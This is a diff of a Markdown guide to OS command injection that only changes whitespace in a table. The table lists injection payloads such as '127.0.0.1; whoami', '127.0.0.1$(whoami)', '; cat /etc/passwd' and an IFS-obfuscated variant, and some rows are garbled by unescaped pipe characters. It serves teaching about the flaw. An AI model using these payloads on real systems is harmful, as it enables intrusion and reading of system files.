@@ -58,16 +58,16 @@ Executes `ping -c 4 127.0.0.1;id`, which also runs the `id` command.
 
 | Type                                        | Description                                           | Example Payload                        |                                            |               |   |          |
 | ------------------------------------------- | ----------------------------------------------------- | -------------------------------------- | ------------------------------------------ | ------------- | - | -------- |
-| **1. Using Command Separators (`;`)**       | Executes multiple commands sequentially               | `127.0.0.1; whoami`                    |                                            |               |   |          |
-| **2. Using Logical AND (`&&`)**             | Executes second command only if the first succeeds    | `127.0.0.1 && whoami`                  |                                            |               |   |          |
+| **1. Using Command Separators (`;`)**       | Executes multiple commands sequentially               | `127.0.0.1; whoami`                    |                                            |               |   |         |
+| **2. Using Logical AND (`&&`)**             | Executes second command only if the first succeeds    | `127.0.0.1 && whoami`                  |                                            |               |   |         |
 | \*\*3. Using Logical OR (\`                 |                                                       | \`)\*\*                                | Executes second command if the first fails | \`invalidhost |   | whoami\` |
-| \*\*4. Using Pipe (\`                       | \`)\*\*                                               | Pipes output of one command to another | \`127.0.0.1                                | whoami\`      |   |          |
-| **5. Using Subshell Execution (`$()`)**     | Executes command inside parentheses first             | `127.0.0.1$(whoami)`                   |                                            |               |   |          |
-| **6. Using Backticks (`` ` ``)**            | Executes command inside backticks                     | `127.0.0.1\`whoami\`\`                 |                                            |               |   |          |
-| **7. Newline Injection (`%0a` or `\n`)**    | Inserts a new command on a new line                   | `127.0.0.1%0awhoami`                   |                                            |               |   |          |
-| **8. File Injection (via `/proc`)**         | Reads or writes to system files (Linux)               | `; cat /etc/passwd`                    |                                            |               |   |          |
-| \*\*9. Command chaining in Windows (`&`, \` | `, `^\`)\*\*                                          | Windows-specific chaining and escaping | `127.0.0.1 & whoami`                       |               |   |          |
-| **10. Obfuscated payloads**                 | Bypasses filters (spaces replaced, URL encoded, etc.) | `127.0.0.1;${IFS}id`                   |                                            |               |   |          |
+| \*\*4. Using Pipe (\`                       | \`)\*\*                                               | Pipes output of one command to another | \`127.0.0.1                                | whoami\`      |   |         |
+| **5. Using Subshell Execution (`$()`)**     | Executes command inside parentheses first             | `127.0.0.1$(whoami)`                   |                                            |               |   |         |
+| **6. Using Backticks (`` ` ``)**            | Executes command inside backticks                     | `127.0.0.1\`whoami\`\`                 |                                            |               |   |         |
+| **7. Newline Injection (`%0a` or `\n`)**    | Inserts a new command on a new line                   | `127.0.0.1%0awhoami`                   |                                            |               |   |         |
+| **8. File Injection (via `/proc`)**         | Reads or writes to system files (Linux)               | `; cat /etc/passwd`                    |                                            |               |   |         |
+| \*\*9. Command chaining in Windows (`&`, \` | `, `^\`)\*\*                                          | Windows-specific chaining and escaping | `127.0.0.1 & whoami`                       |               |   |         |
+| **10. Obfuscated payloads**                 | Bypasses filters (spaces replaced, URL encoded, etc.) | `127.0.0.1;${IFS}id`                   |                                            |               |   |         |
 
 ---
 
